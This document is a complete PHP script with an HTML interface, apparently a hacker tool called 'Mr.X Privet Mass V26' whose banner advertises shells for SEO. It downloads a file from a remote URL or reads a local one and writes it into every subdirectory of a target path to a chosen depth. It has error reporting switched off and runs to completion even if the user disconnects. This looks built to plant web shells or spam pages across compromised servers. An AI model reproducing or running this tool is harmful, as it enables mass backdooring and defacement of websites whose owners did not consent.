<?php
/**
 * Mr.X Privet Mass V26 - Remote & Local Universal Edition
 * Optimized for: Apache, LiteSpeed, Nginx
 */

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

$currentServerPath = dirname(__FILE__);
$output = "";

if (isset($_POST['submit'])) {
    $sourceFile = $_POST['source'];
    $remoteUrl  = trim($_POST['remote']);
    $targetDir  = rtrim($_POST['target'], '/');
    $customName = trim($_POST['custom_name']);
    $maxDepth   = (int)$_POST['depth'];

    $fileContent = false;
    $originalName = "";

    // Step 1: Get Content (Remote or Local)
    if (!empty($remoteUrl)) {
        $fileContent = file_get_contents($remoteUrl);
        $originalName = basename(parse_url($remoteUrl, PHP_URL_PATH));
    } elseif (!empty($sourceFile) && file_exists($sourceFile)) {
        $fileContent = file_get_contents($sourceFile);
        $originalName = basename($sourceFile);
    }

    // Step 2: Validate and Deploy
    if ($fileContent === false) {
        $output = "<span style='color: #ff4d4d;'>[Error] Failed to fetch content. Check local path or remote URL.</span>";
    } elseif (!is_dir($targetDir)) {
        $output = "<span style='color: #ff4d4d;'>[Error] Target path is invalid.</span>";
    } else {
        $finalFileName = !empty($customName) ? $customName : $originalName;
        $results = [];

        $deploy = function($dir, $currentDepth) use (&$deploy, $maxDepth, $fileContent, $finalFileName, &$results) {
            if ($currentDepth > $maxDepth) return;

            $items = @scandir($dir);
            if (!$items) return;

            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                
                if (is_dir($path)) {
                    $dest = $path . DIRECTORY_SEPARATOR . $finalFileName;
                    
                    if (file_put_contents($dest, $fileContent) !== false) {
                        $size = round(strlen($fileContent) / 1024, 2);
                        $results[] = "<span style='color: #00ff00;'>[Deployed]</span> ($size KB) -> $dest";
                    } else {
                        $results[] = "<span style='color: #ff4d4d;'>[Failed]</span> -> $dest";
                    }
                    $deploy($path, $currentDepth + 1);
                }
            }
        };

        $deploy($targetDir, 1);
        $output = implode("<br>", $results);
        if (empty($results)) $output = "No subdirectories found within the specified depth.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Mr.X Privet Mass V26</title>
    <style>
        body { background-color: #050505; color: #eee; font-family: 'Consolas', monospace; margin: 0; padding: 20px; }
        .container { max-width: 950px; margin: 0 auto; background: #111; padding: 40px; border-radius: 5px; border: 1px solid #222; box-shadow: 0 0 20px #000; }
        .banner { text-align: center; margin-bottom: 10px; }
        .banner h1 { font-size: 3.5em; margin: 0; font-weight: 900; }
        .red { color: #ff0000; }
        .white { color: #ffffff; }
        .server-info { text-align: center; color: #888; margin-bottom: 30px; font-size: 13px; border-bottom: 1px solid #222; padding-bottom: 15px; }
        .current-path { color: #00ff00; font-weight: bold; }
        .subtitle { font-size: 11px; color: #444; margin-top: 5px; text-transform: lowercase; }
        
        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .full-width { grid-column: span 2; }
        label { display: block; margin-bottom: 5px; font-size: 10px; color: #666; text-transform: uppercase; font-weight: bold; }
        input { width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #333; color: #00ff00; border-radius: 3px; box-sizing: border-box; }
        input:focus { outline: none; border-color: #ff0000; }
        
        button { width: 100%; padding: 18px; background: #ff0000; border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 3px; text-transform: uppercase; margin-top: 20px; font-size: 16px; letter-spacing: 1px; }
        button:hover { background: #d00000; }
        
        .console { margin-top: 30px; background: #000; padding: 20px; border: 1px solid #222; max-height: 500px; overflow-y: auto; font-size: 12px; line-height: 1.6; border-left: 3px solid #ff0000; }
    </style>
</head>
<body>

<div class="container">
    <div class="banner">
        <h1><span class="red">Mr.X</span> <span class="white">Privet Mass V26</span></h1>
        <div class="subtitle">for more tools and shell for seo : @jackleet</div>
    </div>

    <div class="server-info">
        CURRENT DIRECTORY PATH: <span class="current-path"><?php echo $currentServerPath; ?>/</span>
    </div>

    <form method="POST">
        <div class="form-grid">
            <div class="form-group full-width">
                <label>Source File Path (Local)</label>
                <input type="text" name="source" placeholder="source file path">
            </div>

            <div class="form-group full-width">
                <label>Remote File URL (Direct Link)</label>
                <input type="text" name="remote" placeholder="input file direct link">
            </div>
            
            <div class="form-group">
                <label>Target Root Directory</label>
                <input type="text" name="target" placeholder="target path" required>
            </div>

            <div class="form-group">
                <label>Save As (New Filename)</label>
                <input type="text" name="custom_name" placeholder="example.php">
            </div>

            <div class="form-group full-width">
                <label>Max Depth (Recursion Level)</label>
                <input type="number" name="depth" value="1" min="1" max="10">
            </div>
        </div>

        <button type="submit" name="submit">EXECUTE MASS DEPLOYMENT</button>
    </form>

    <?php if ($output): ?>
    <div class="console">
        <?php echo $output; ?>
        <br><br><span style="color: #444;">[!] Task Ended.</span>
    </div>
    <?php endif; ?>
</div>

</body>
</html>